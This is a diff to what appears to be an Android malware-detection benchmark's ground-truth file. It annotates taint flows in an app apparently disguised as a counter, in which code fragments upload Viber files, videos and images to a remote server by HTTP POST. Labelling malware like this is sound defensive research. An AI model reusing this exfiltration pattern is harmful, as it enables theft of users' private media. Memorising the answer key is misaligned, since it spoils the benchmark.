@@ -95,7 +95,8 @@
         "pathConstraints": true
       },
       "ID": 1,
-      "description": "This malicious flow starts by getting the external storage path and uploads data from the Viber directories to a remote server per an HTTP POST request. There are checks along the flow for checking if the app Viber is installed. "
+      "description": "This malicious flow starts by getting the external storage path and uploads data from the Viber directories to a remote server per an HTTP POST request. There are checks along the flow for checking if the app Viber is installed. ",
+      "isNegative": false
     },
     {
       "source": {
@@ -162,7 +163,114 @@
         "pathConstraints": true
       },
       "ID": 2,
-      "description": "This malicious flow reading videos from the Viber directories to a remote server per an HTTP POST request. There are checks along the flow for checking if the app Viber is installed. "
+      "description": "This malicious flow reading videos from the Viber directories to a remote server per an HTTP POST request. There are checks along the flow for checking if the app Viber is installed. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "targetName": "File",
+        "targetNo": 1,
+        "statement": "upPst(new File((String) ((List) listAll.get(index)).get(1)), flagOk_ + \"_\" + listAll.size() + \"_index_\" + index + \"_\", vid_);",
+        "methodName": "public void upFF(String folder_, String flagOk_, String flagIndex_, boolean vid_)",
+        "className": "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
+        "lineNo": 355,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r4.<java.io.File: void <init>(java.lang.String)>($r12)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "exchange",
+        "targetNo": 1,
+        "statement": "new RestTemplate().exchange(MyVariables.SERVERURL2, HttpMethod.POST, new HttpEntity(formData, requestHeaders), String.class, new Object[0]);",
+        "methodName": "public String getFilename()",
+        "className": "gr.georkouk.kastorakiacounter_new.MyServerFunctions.AnonymousClass1",
+        "lineNo": 433,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r1 = virtualinvoke $r2.<java.io.File: java.lang.String getName()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (vd) {",
+          "methodName": "private void upPst(File file, String name, boolean vd)",
+          "className": "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
+          "lineNo": 372,
+          "ID": 1
+        },
+        {
+          "statement": "formData.add(\"image\", new FileSystemResource(file));",
+          "methodName": "private void upPst(File file, String name, boolean vd)",
+          "className": "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
+          "lineNo": 440,
+          "ID": 2
+        }
+      ],
+      "description": "This malicious flow sends image to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "pathConstraints": true,
+        "appendToString": true
+      },
+      "ID": 3
+    },
+    {
+      "source": {
+        "targetName": "File",
+        "targetNo": 1,
+        "statement": "upPst(new File(PathOfImage), flagOk_ + \"_\" + cursor_.getCount() + \"_index_\" + index + \"_\", false);",
+        "methodName": "public void upFC(Cursor cursor_, String flagOk_, String flagIndex_)",
+        "className": "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
+        "lineNo": 330,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r4.<java.io.File: void <init>(java.lang.String)>($r8)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "RestTemplate",
+        "targetNo": 1,
+        "statement": "new RestTemplate().exchange(MyVariables.SERVERURL2, HttpMethod.POST, new HttpEntity(formData, requestHeaders), String.class, new Object[0]);",
+        "methodName": "public String getFilename()",
+        "className": "gr.georkouk.kastorakiacounter_new.MyServerFunctions.AnonymousClass1",
+        "lineNo": 433,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r1 = virtualinvoke $r2.<java.io.File: java.lang.String getName()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (vd) {",
+          "methodName": "private void upPst(File file, String name, boolean vd)",
+          "className": "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
+          "lineNo": 372,
+          "ID": 1
+        },
+        {
+          "statement": "formData.add(\"image\", new FileSystemResource(file));",
+          "methodName": "private void upPst(File file, String name, boolean vd)",
+          "className": "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
+          "lineNo": 440,
+          "ID": 2
+        }
+      ],
+      "description": "This malicious flow sends images to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "pathConstraints": true,
+        "appendToString": true
+      },
+      "ID": 4
     }
   ]
 }
